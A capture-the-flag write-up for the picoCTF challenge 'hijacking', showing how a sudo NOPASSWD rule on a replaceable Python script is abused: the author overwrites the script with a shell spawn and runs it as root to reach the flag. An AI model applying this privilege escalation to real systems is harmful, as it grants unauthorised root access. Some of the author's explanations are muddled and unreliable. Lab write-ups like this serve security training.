# Challange Info

Name : hijacking

Difficulty : Medium

Category : Binary Exploitation

Link : https://play.picoctf.org/practice/challenge/352?category=6&page=2

(Note : I will suggest look for other writeups as I don't think this is intended solution for this challange)

# Writeup

The challange provides SSH details.

Logging in via ssh.

```bash
ssh picoctf@saturn.picoctf.net -p 60826
```

Listing all files in home directory.

```bash
ls -al
```

The file which caught my eye was .server.py.

> -rw-r--r-- 1 root    root     375 Feb  7  2024 .server.py

But as it's not writeable if we try to edit the file it will drop to picoctf user from root.

So we check if picoctf is allowed to run commands as sudo.

```bash
sudo -l
```

> User picoctf may run the following commands on challenge:
> 
>    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py

We can run the python file as sudo.

Using vim to edit the file.

```bash
vim .server.py
```

Replacing file contents with following :

```python
import os
os.system("/bin/sh")
```

(Note : We have to use vim as it allows file to drop from root to picoctf and nano is not avalaible on the server)

In order to exit vim.

```bash
wq!
q!
```

This will give error but when we quit vim we'll get the file dropped from root to picoctf user it dosen't matter as we can anyway run the file as root user via sudo.

Running the python script as sudo. 

(Note : That the allowed config uses relative path for .server.py so we also have to do the same or it'll give us error that we are not allowed to execute the file. For python3 it gets the relative path from PATH variable.)

```bash
sudo python3 /home/picoctf/.server.py
```

We get root shell.

Navigating to /root and listing all files.

```bash
cd /root
ls -al
```

> -rw-r--r-- 1 root root   43 Sep 26 19:29 .flag.txt
